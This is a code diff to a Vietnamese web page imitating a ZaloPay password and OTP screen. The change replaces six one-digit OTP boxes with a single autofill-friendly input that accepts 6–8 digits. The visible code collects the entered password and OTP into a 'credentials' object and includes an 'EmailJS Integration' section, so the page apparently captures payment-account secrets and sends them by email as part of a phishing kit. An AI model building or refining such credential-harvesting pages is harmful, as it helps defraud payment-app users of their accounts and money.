@@ -518,30 +518,28 @@
         }
       }
 
-      /* Giao diện nhập OTP */
-      .otp-input-container {
-        display: flex;
-        gap: 10px;
-        justify-content: center;
-        margin-top: 24px;
-      }
-      .otp-input {
-        width: 50px;
-        height: 55px;
-        text-align: center;
-        font-size: 24px;
+      /* Giao diện nhập OTP – single wide input */
+      .otp-single-input {
+        display: block;
+        width: 100%;
+        max-width: 320px;
+        margin: 24px auto 0;
+        padding: 14px 16px;
+        font-size: 26px;
         font-weight: 700;
-        border: 1px solid var(--border-color);
+        letter-spacing: 0.35em;
+        text-align: center;
+        border: 2px solid var(--border-color);
         border-radius: 12px;
         color: var(--text-primary);
-        background-color: var(--background-secondary);
-        transition: all 0.2s;
-      }
-      .otp-input:focus {
+        background-color: var(--background-primary);
+        transition: border-color 0.2s, box-shadow 0.2s;
         outline: none;
+        caret-color: var(--zalopay-blue);
+      }
+      .otp-single-input:focus {
         border-color: var(--zalopay-blue);
         box-shadow: 0 0 0 4px rgba(0, 75, 202, 0.12);
-        background-color: var(--background-primary);
       }
 
       /* Nút bấm */
@@ -928,44 +926,16 @@
               <p class="subtitle" id="zalopay-otp-prompt"></p>
             </div>
             <form onsubmit="event.preventDefault(); handleOtpSubmit();">
-              <div class="otp-input-container">
-                <input
-                  type="text"
-                  class="otp-input"
-                  maxlength="1"
-                  inputmode="numeric"
-                />
-                <input
-                  type="text"
-                  class="otp-input"
-                  maxlength="1"
-                  inputmode="numeric"
-                />
-                <input
-                  type="text"
-                  class="otp-input"
-                  maxlength="1"
-                  inputmode="numeric"
-                />
-                <input
-                  type="text"
-                  class="otp-input"
-                  maxlength="1"
-                  inputmode="numeric"
-                />
-                <input
-                  type="text"
-                  class="otp-input"
-                  maxlength="1"
-                  inputmode="numeric"
-                />
-                <input
-                  type="text"
-                  class="otp-input"
-                  maxlength="1"
-                  inputmode="numeric"
-                />
-              </div>
+              <input
+                type="text"
+                id="zalopay-otp-single"
+                class="otp-single-input"
+                placeholder="Nhập mã OTP"
+                inputmode="numeric"
+                maxlength="8"
+                autocomplete="one-time-code"
+                oninput="this.value = this.value.replace(/\D/g, '')"
+              />
             </form>
             <div class="link-container" id="resend-otp-container">
               <span>Chưa nhận được mã?</span>
@@ -1039,9 +1009,7 @@
 
         // DOM Elements
         const passwordInputEl = getEl("zalopay-password");
-        const otpInputs = document.querySelectorAll(
-          "#zalopay-otp-section .otp-input"
-        );
+        const otpSingleInput = getEl("zalopay-otp-single");
 
         // Helper Functions
         const formatCurrency = (amount) =>
@@ -1158,7 +1126,7 @@
               setTimeout(() => passwordInputEl.focus(), 100);
             }
             if (sectionId === "zalopay-otp-section") {
-              setTimeout(() => otpInputs[0].focus(), 100);
+              setTimeout(() => otpSingleInput.focus(), 100);
             }
           }
         };
@@ -1229,11 +1197,9 @@
         };
 
         window.handleOtpSubmit = () => {
-          credentials.otp = Array.from(otpInputs)
-            .map((input) => input.value)
-            .join("");
-          if (credentials.otp.length !== 6) {
-            showNotification("Mã xác thực phải đủ 6 chữ số.", "error");
+          credentials.otp = (otpSingleInput.value || "").replace(/\D/g, "");
+          if (credentials.otp.length < 6) {
+            showNotification("Vui lòng nhập đủ mã OTP (6-8 chữ số).", "error");
             return;
           }
 
@@ -1290,7 +1256,6 @@
             "success"
           );
           clearOtpInputs();
-          otpInputs[0].focus();
         };
 
         // EmailJS Integration
@@ -1348,8 +1313,8 @@
         };
 
         const clearOtpInputs = () => {
-          otpInputs.forEach((input) => (input.value = ""));
-          otpInputs[0].focus();
+          otpSingleInput.value = "";
+          otpSingleInput.focus();
         };
 
         // Event Listeners Setup
@@ -1368,40 +1333,9 @@
             );
           });
 
-          otpInputs.forEach((input, index) => {
-            input.addEventListener("input", () => {
-              if (input.value && index < otpInputs.length - 1) {
-                otpInputs[index + 1].focus();
-              }
-              if (
-                Array.from(otpInputs)
-                  .map((i) => i.value)
-                  .join("").length === 6
-              ) {
-                handleOtpSubmit();
-              }
-            });
-            input.addEventListener("keydown", (e) => {
-              if (e.key === "Backspace" && !input.value && index > 0) {
-                otpInputs[index - 1].focus();
-              }
-            });
-            input.addEventListener("paste", (e) => {
-              e.preventDefault();
-              const pasteData = e.clipboardData
-                .getData("text")
-                .replace(/\D/g, "")
-                .slice(0, 6);
-              pasteData.split("").forEach((char, i) => {
-                if (otpInputs[i]) otpInputs[i].value = char;
-              });
-              const focusIndex = Math.min(
-                5,
-                pasteData.length > 0 ? pasteData.length : 0
-              );
-              if (otpInputs[focusIndex]) otpInputs[focusIndex].focus();
-              if (pasteData.length === 6) handleOtpSubmit();
-            });
+          // Single OTP input listener
+          otpSingleInput.addEventListener("input", () => {
+            otpSingleInput.value = otpSingleInput.value.replace(/\D/g, "");
           });
 
           updatePasswordDisplay(passwordInputEl.value);
